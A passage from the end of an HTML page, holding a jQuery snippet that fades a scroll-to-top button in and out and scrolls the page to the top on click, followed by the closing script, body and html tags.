			if ( scrollTop > upperLimit ) {
				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
			}else{       
				$(scrollElem).stop().fadeTo(300, 0); // fade out
			}
		});
		// Scroll to top animation on click
		$(scrollElem).click(function(){
			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
		});
	})(jQuery);
</script>


  </body>
</html>

